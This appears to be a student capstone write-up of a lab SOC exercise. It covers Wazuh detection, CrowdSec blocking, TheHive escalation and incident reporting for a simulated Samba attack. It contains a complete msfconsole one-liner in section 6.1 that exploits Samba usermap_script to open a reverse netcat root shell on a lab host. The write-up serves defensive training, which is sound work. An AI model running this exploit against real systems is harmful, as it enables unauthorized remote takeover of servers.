# Lab Task 6: Capstone Project - Full SOC Workflow Simulation 
**Tools:** Metasploit, Wazuh, CrowdSec, TheHive 5, Google Docs  

---

## 6.1 Attack Simulation (Red Team Phase)
**Objective:** Simulate a high-impact exploit to generate realistic telemetry for detection testing.

### Execution:
- **Target:** Metasploitable2 (192.168.1.15)  
- **Exploit:** `exploit/multi/samba/usermap_script`  
- **Payload:** `cmd/unix/reverse_netcat`  
- **Command:** `msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS 192.168.1.15; set LHOST 192.168.1.200; exploit"`  

**Result:** Successfully gained a root shell on the target machine via the Samba vulnerability.

---

## 6.2 Detection & Triage (Blue Team Phase)
**Objective:** Identify the attack in the SIEM and categorize it using the MITRE ATT&CK framework.

### Detection Log:
| Timestamp            | Source IP      | Alert Description        | MITRE Technique |
|----------------------|----------------|--------------------------|-----------------|
| 2026-03-13 14:00:00  | 192.168.1.200  | Samba usermap_script RCE | T1210           |

**Triage Note:** Wazuh triggered Rule ID `1002` (System log error) and a custom signature for `ncat` reverse shell activity. The speed of the exploit and the resulting root shell confirmed a "Critical" severity incident.

---

## 6.3 Response & Containment
**Objective:** Neutralize the threat and prevent further movement within the network.

### Actions:
1. **IP Blocking:** Used **CrowdSec** to apply a "Decision" to ban the attacker IP (`192.168.1.200`).  
   - **Command:** `sudo cscli decisions add --ip 192.168.1.200 --reason "Samba Exploit Attempt"`
2. **Network Isolation:** Disconnected the Metasploitable2 virtual NIC to prevent lateral movement.
3. **Verification:** A `ping` test from the attacker machine to the target returned "Destination Host Unreachable," confirming successful containment.

---

## 6.4 Escalation (TheHive)
**Objective:** Transfer the incident to the forensic team for root cause analysis.

### Tier 2 Case Summary:
> "A Critical-level incident was identified involving a Remote Code Execution (RCE) on Server-Y via the Samba service. The attacker (192.168.1.200) successfully spawned a reverse shell with root privileges. We have implemented active containment via CrowdSec and isolated the host. While the immediate threat is neutralized, we require Tier 2 to perform a full 'Blast Radius' assessment to check for unauthorized data access and the installation of persistent backdoors in the system's cron jobs or SSH keys."

---

## 6.5 Final Incident Report (SANS Template Style)

### Executive Summary:
On 2026-03-13, the SOC detected and suppressed a successful RCE attack against a legacy Samba service. The incident was detected within 2 minutes of exploitation and contained within 10 minutes. No data exfiltration was observed.

### Timeline:
- **14:00:** Attack initiated via Metasploit.
- **14:02:** Wazuh alerts generated; Triage initiated.
- **14:05:** Incident confirmed as True Positive; Case opened in TheHive.
- **14:10:** CrowdSec block applied; Target host isolated.

### Recommendations:
1. **Patching:** Update Samba to a non-vulnerable version or decommission legacy Metasploitable instances.
2. **Segmentation:** Place legacy systems in a restricted VLAN with no outbound internet access.

---

## 6.6 Management Briefing (Non-Technical)
> "We successfully detected and stopped a cyber-attack targeting one of our test servers today. Our security monitoring tools (Wazuh) alerted the team immediately when the attacker tried to take control of the server. Within minutes, our automated defense system (CrowdSec) blocked the attacker's access, and we safely disconnected the affected server from the rest of our network. No sensitive company data was reached, and we are currently performing a deep-clean of the system to ensure it is safe to return to service."

---

## 7. Capstone Verification
- [x] Exploit successful (Root Shell achieved).
- [x] Alert triggered in Wazuh.
- [x] Attacker IP successfully blocked by CrowdSec.
- [x] Documentation complete for both technical and non-technical audiences.
